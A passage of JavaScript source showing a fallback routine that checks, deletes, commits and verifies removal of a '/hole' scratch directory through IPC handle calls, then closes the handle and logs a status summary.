    }

    let initial = null;
    let deletion = null;
    let commit = null;
    let verification = null;
    let reason = null;
    let shouldVerify = false;
    let closeResult = null;
    let absenceVerifiedByPrimary = false;

    try {
        await emitVerboseStage(
            "HOLE FALLBACK: checking /hole on the reserved " +
            "temporary save handle.");

        if (!attemptState.workersQuiesced) {
            reason = "workers-not-quiesced";

        } else if (attemptState.primaryScratchCleanupVerified) {
            absenceVerifiedByPrimary = true;

        } else {
            initial = readEntryTypeChecked(handle, SCRATCH_DIR);

            if (initial.transport !== 0) {
                reason = "initial-check-transport=" +
                    formatCode(initial.transport);

            } else if (initial.result === NOT_FOUND) {
                if (!attemptState.primaryCommitVerified) {
                    commit = ipcCommitChecked(handle);
                    if (commit.transport !== 0 || commit.result !== 0) {
                        reason = "recommit-failed";
                    } else {
                        verification = readEntryTypeChecked(handle, SCRATCH_DIR);
                        if (verification.transport !== 0 ||
                            verification.result !== NOT_FOUND)
                            reason = "absence-verification-failed-after-recommit";
                    }
                } else {
                    verification = initial;
                }
                shouldVerify = !reason && Boolean(verification);

            } else if (initial.result === 0 && initial.type === 0) {
                deletion = ipcDeleteDirectoryRecursivelyChecked(handle, SCRATCH_DIR);
                if (deletion.transport !== 0 || deletion.result !== 0) {
                    reason = "delete-failed";
                } else {
                    commit = ipcCommitChecked(handle);
                    if (commit.transport !== 0 || commit.result !== 0)
                        reason = "commit-failed";
                    else
                        shouldVerify = true;
                }

            } else if (initial.result === 0) {
                reason = "path-exists-but-is-not-a-directory";

            } else {
                reason = "initial-check-result=" + formatCode(initial.result);
            }

            if (shouldVerify && !verification) {
                verification = readEntryTypeChecked(handle, SCRATCH_DIR);
                if (verification.transport !== 0 ||
                    verification.result !== NOT_FOUND)
                    reason = "absence-verification-failed";
            }
        }
    } catch (error) {
        reason = "handler-threw:" + String(error?.message || error);
    } finally {
        attemptState.holeAbsentVerified = Boolean(
            !reason &&
            (absenceVerifiedByPrimary ||
                (shouldVerify &&
                    verification?.transport === 0 &&
                    verification?.result === NOT_FOUND)));
        try {
            closeResult = Number(closeHandle(handle)) >>> 0;
        } catch (error) {
            reason = reason || "handle-close-threw:" +
                String(error?.message || error);
        }
        attemptState.holeCleanupHandle = 0;
    }

    attemptState.holeCleanupVerified = Boolean(
        attemptState.holeAbsentVerified &&
        closeResult === 0);

    if (!attemptState.cleanupVerified &&
        attemptState.holeCleanupVerified &&
        attemptState.primaryCleanupAttempted &&
        attemptState.primaryHandlesClosed &&
        attemptState.endpointRetirementVerified &&
        attemptState.workerStateSafe) {
        attemptState.cleanupVerified = true;
        attemptState.cleanupSummary =
            "fallback /hole cleanup verified; " +
            "endpoint retired and all primary handles closed";
    }

    let initialText;
    if (absenceVerifiedByPrimary) {
        initialText = "primary-cleanup-verified";
    } else if (initial?.transport !== 0) {
        initialText = "transport=" + formatCode(initial?.transport);
    } else if (initial?.result === NOT_FOUND) {
        initialText = "already-absent";
    } else if (initial?.result === 0) {
        initialText = "present-type=" + initial.type;
    } else {
        initialText = "result=" + formatCode(initial?.result);
    }

    let commitText;
    if (commit) {
        commitText = formatCode(commit.transport) + "/" +
            formatCode(commit.result);
    } else if (attemptState.primaryCommitVerified) {
        commitText = "primary-verified";
    } else {
        commitText = "not-needed";
    }

    await emitVerboseStage(
        "HOLE FALLBACK: initial=" + initialText +
        "; delete=" + (deletion
            ? formatCode(deletion.transport) + "/" +
              formatCode(deletion.result)
            : "not-needed") +
        "; commit=" + commitText +
        "; fallbackIpc=" + (absenceVerifiedByPrimary ? "skipped" : "used") +
        "; absent=" + (attemptState.holeAbsentVerified ? "verified" : "no") +
        "; handleClose=" + formatCode(closeResult) +
        (reason ? "; reason=" + reason : "") + ".");

    return attemptState.holeCleanupVerified;
}
